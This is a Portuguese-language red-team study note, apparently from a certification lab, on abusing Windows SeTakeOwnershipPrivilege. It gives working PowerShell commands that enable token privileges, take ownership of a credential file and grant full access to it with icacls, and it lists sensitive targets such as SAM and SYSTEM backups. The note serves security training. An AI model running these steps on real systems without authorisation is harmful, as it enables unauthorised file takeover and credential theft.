> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/windows-privilege-escalation/setakeownershipprivilege.md).

# SeTakeOwnershipPrivilege

O privilégio `SeTakeOwnershipPrivilege` concede a um usuário a capacidade de assumir a propriedade de qualquer "objeto protegível", ou seja, objetos do Active Directory, arquivos/pastas NTFS, impressoras, chaves de registro, serviços e processos.

* **Revisão dos privilégios atuais do usuário**

```ps
whoami /priv
```

**Habilitando SeTakeOwnershipPrivilege**

* Observe na saída que o privilégio não está habilitado. Podemos habilitá-lo usando este [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) , detalhado nesta [postagem](https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/) do blog, bem como [este](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) outro, que se baseia no conceito inicial.

{% code lineNumbers="true" %}

```ps
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv
```

{% endcode %}

* **Selecionando um arquivo de destino**

```ps
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```

* **Verificando a propriedade do arquivo**

```ps
cmd /c dir /q 'C:\Department Shares\Private\IT'
```

* Agora podemos usar o comando binário [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) do Windows para alterar a propriedade do arquivo.

```ps
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

* Podemos confirmar a propriedade usando o mesmo comando de antes. Agora vemos que nossa conta de usuário é a proprietária do arquivo.

```ps
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```

* Pode ser que ainda não consigamos ler o arquivo e precisemos modificar a ACL do arquivo `icacls`para que possamos lê-lo

```ps
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

* **Arquivos de interesse**

```ps
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```
